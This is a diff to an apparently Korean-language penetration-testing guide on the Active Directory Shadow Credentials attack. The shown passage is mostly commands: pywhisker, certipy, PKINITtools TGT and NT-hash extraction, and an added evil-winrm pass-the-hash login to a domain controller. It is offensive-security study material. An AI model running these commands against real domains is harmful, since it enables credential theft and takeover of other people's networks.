@@ -477,9 +477,7 @@ pywhisker -d corp.local -u john -p 'Password1!' \
 #     [+] Password: xxxxxxxxxxxx
 
 # 생성된 PFX로 TGT 요청 (gettgtpkinit.py 사용)
-# certipy 또는 PKINITtools 필요
-certipy auth -pfx <생성된파일>.pfx -dc-ip <DC_IP>
-# PKINITtools 경우 다운로드 명령어 - git clone https://github.com/dirkjanm/PKINITtools
+# certipy 또는 PKINITtools 필요 (PKINITtools 경우 다운로드 명령어 - git clone https://github.com/dirkjanm/PKINITtools)
 python3 gettgtpkinit.py \
   -cert-pfx <생성된파일>.pfx \
   -pfx-pass <생성된패스워드> \
@@ -488,7 +486,7 @@ python3 gettgtpkinit.py \
 
 # TGT로 NTLM 해시 추출
 export KRB5CCNAME=targetuser.ccache
-python3 getnthash.py corp.local/targetuser -k
+python3 <getnthash.py> -key <추출된 키 값> <도메인 이름>/<타겟 유저>
 
 # 또는 certipy로 한번에 처리
 certipy shadow auto \
@@ -496,6 +494,9 @@ certipy shadow auto \
   -p 'Password1!' \
   -account targetuser \
   -dc-ip <DC_IP>
+
+# evil-winrm 접속 
+evil-winrm -i <DC_IP> -u <타겟 유저> -H <해시>
 ```
 
 ```powershell
